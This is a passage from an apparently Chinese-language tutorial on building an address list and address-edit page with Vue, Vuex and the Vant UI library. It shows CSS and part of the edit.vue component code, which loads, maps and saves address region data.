style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/* 禁用状态的地址项样式 */</span></span><span class="line"><span style="color: #D7BA7D">.van-address-list__item--disabled</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f5f5f5</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 禁用项的背景色</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#999</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 禁用项的文字颜色</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h3 id="地址编辑"><a class="markdownIt-Anchor" href="#地址编辑"></a> 地址编辑</h3><p>地址编辑可以是新建也可以是更新操作：<code>views/address/edit.vue</code></p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">&lt;!-- 可编辑也可以作为添加地址的页面 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"address-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"地址编辑"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"address-edit"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-address-edit</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">address-info</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">area-list</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">show-delete</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">show-set-default</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsId</span><span style="color: #D4D4D4"> != -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> ? </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4"> : </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">show-search-result</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">search-result</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">searchResult</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">area-columns-placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'请选择'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'请选择'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'请选择'</span><span style="color: #D4D4D4">]</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">detail-maxlength</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">20</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">save</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onSave</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">delete</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onDelete</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">change-default</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onChangeDefault</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vant"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">mapActions</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">mapGetters</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vuex"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@vant/area-data"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 引入vant官方的地区数据</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"AddressEdit"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">adsId:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 地址id</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">addressInfo:</span><span style="color: #D4D4D4"> {}, </span><span style="color: #6A9955">// 初始地址详情对象，若是新建地址则为空对象</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">areaList:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 地区列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">searchResult:</span><span style="color: #D4D4D4"> [], </span><span style="color: #6A9955">// 详细地址搜索结果</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">checkDefault:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 默认地址的标识，数据内的isDefault会随着设置按钮而改变，此字段标识数据原始状态</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"AddressMap"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"nameToCode"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"codeToName"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取要进行编辑的地址id，如果为空则赋值为-1表示为新建地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">getAdsId</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">query</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsid</span><span style="color: #D4D4D4"> || -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 构建映射表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">buildReverseMaps</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取要进行编辑的地址id，如果为空则赋值为-1表示为新建地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getAdsId</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log('adsId:', this.adsId)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 如果adsId不等于-1，则进行地址详情的拉取</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsId</span><span style="color: #D4D4D4"> !== -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 说明是编辑地址，则需要拉取地址详情</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">: { </span><span style="color: #4FC1FF">detail</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">      } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getAddressDetail</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsId</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">id:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">tel:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phone</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">province:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">codeToName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province_id</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">city:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">codeToName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city_id</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">county:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">codeToName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county_id</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">addressDetail:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">areaCode:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">region_id</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">isDefault:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      };</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 从Vuex得到默认地址的id</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">defaultAddressId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">Address</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 比对当前地址是否为默认地址</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">) === </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"当前地址为默认地址"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 设置默认按钮为打开状态</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">checkDefault</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 为真说明该地址获取的时候就是默认地址</span></span><span class="line"><span style="color: #D4D4D4">      } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 说明当前地址不是默认地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"当前地址不是默认地址"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 设置默认按钮为关闭状态</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">checkDefault</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 为假说明该地址获取的时候不是默认地址</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 说明是新建地址，不做操作</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address"</span><span style="color: #D4D4D4">, [</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"getAddressDetail"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"addAddress"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"updateAddress"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    ]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"AddressMap"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"buildReverseMaps"</span><span style="color: #D4D4D4">]),</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 保存地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">onSave</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 判断是新建地址还是编辑地址</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsId</span><span style="color: #D4D4D4"> === -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 新建地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">country</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"中国"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 使用映射表进行地区数据处理</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">region</span><span style="color: #D4D4D4"> = [</span></span><span class="line"><span style="color: #D4D4D4">          {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">nameToCode</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province</span><span style="color: #D4D4D4">)) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">label:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          },</span></span><span class="line"><span style="color: #D4D4D4">          {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">nameToCode</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city</span><span style="color: #D4D4D4">)) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">label:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: 